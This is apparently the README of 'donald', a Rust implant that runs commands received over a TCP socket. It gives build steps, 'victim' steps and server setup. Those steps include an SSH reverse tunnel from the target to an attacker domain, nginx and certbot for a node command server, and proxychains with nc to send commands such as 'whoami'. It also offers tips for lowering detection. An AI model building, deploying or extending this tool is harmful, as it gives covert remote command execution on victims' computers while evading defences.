# Donald

_back to white house_

Donald takes an message from a TCP socket and run system command : cmd(message);
It's a puppet.

```
       ////\\\\
     ////    \\\\
    |    O  O    |
    |      ^      |
    |   \\_____/   |
     \\            /
      \\__________/
```

## Why ?

If you succeed to create a reverse shell with a proxy ( like wiht ssh ) you may want to run custom command from your server.

### TLDR :
#### Build donald
- edit build.rs 
- set listeninterface to 127 for less detections
- set REMOTEURL to your.domain
- set DEBUG if needed but may increase the detection risk
- cargo build --release --target x86_64-pc-windows-gnu

#### Victim : 
Run : 
```
Term1 : ssh -o StrictHostKeyChecking=accept-new -R <ZPORT> -i .\id_rsa <SSH_USER>@<domain>
Term2 : donald.exe
```

#### Server : 
```
git clone https://github.com/shoxxdj/donald.git
sudo apt update && sudo apt install nodejs npm -y
sudo apt install nginx
apt install proxychains
sudo apt-get install python3-certbot-nginx
vim /etc/nginx/sites-available/default
```
paste this content (edit your domain)

```
server {
    server_name  your.domain;
    
    # HTTP configuration
    
    # HTTP to HTTPS
    if ($scheme != "https") {
        return 301 https://$host$request_uri;
    } # managed by Certbot
    
    # HTTPS configuration
    listen [::]:443 ssl ipv6only=on; # managed by Certbot
    listen 443 ssl; # managed by Certbot
    ssl_certificate /etc/letsencrypt/live/your.domain/fullchain.pem; # managed by Certbot
    ssl_certificate_key /etc/letsencrypt/live/your.domain/privkey.pem; # managed by Certbot
    include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot

    location / {
        proxy_pass  http://127.0.0.1:8080;
        proxy_redirect                      off;
        proxy_set_header  Host              $http_host;
        proxy_set_header  X-Real-IP         $remote_addr;
        proxy_set_header  X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header  X-Forwarded-Proto $scheme;
        proxy_read_timeout                  900;
    }

}

server {
    if ($host = donald.shoxxdj.fr) {
        return 301 https://$host$request_uri;
    } # managed by Certbot


    server_name donald.shoxxdj.fr;
    listen 80;
    listen [::]:80;
    return 404; # managed by Certbot

```
finaly : 
```
sudo certbot --nginx -d your.domain
```
Then edit proxychains to :
```
socks4 127.0.0.1 <ZPORT>
```

Term 1 :
```
cd whitehouse
node app.js
```
Term 2 : 

```
echo "whoami" | proxychains nc 127.0.0.1 1234
```


### How to setup the server ?

![alt text](image.png)

1. Edit /etc/ssh/sshd_config to set GatewayPorts to yes
2. Setup proxychains in socks4 127.0.0.1 <ZPORT>
3. cd whitehouse && npm install && node app.js (sudo apt update && sudo apt install nodejs npm -y)
4. Configure nginx as reverse proxy for the node application (sudo apt install nginx)
5. Configure nginx with https certificate (sudo certbot --nginx -d <domain>)
6. Run the app.js in a first terminal
7. Prepare a second terminal : "echo 'test' | proxychains 127.0.0.1 <DONALD_LISTENPORT>"

### On the victim computer

1. Start donald.exe
2. ssh -o StrictHostKeyChecking=accept-new -R <ZPORT> -i .\id_rsa <SSH_USER>@<domain> (use -v -v -v -v for debug) (and obviously put the id_rsa file on the target and associated public key on the server)

## Build

Edit build.rs with adapted values.

Linux target :

```
cargo build --release
```

Windows target :

```
cargo build --release --target x86_64-pc-windows-gnu
```

If error this might solve:

```
sudo apt install mingw-w64
rustup target add x86_64-pc-windows-gnu
```

## Setup

## Debug

It's rust. No bug.
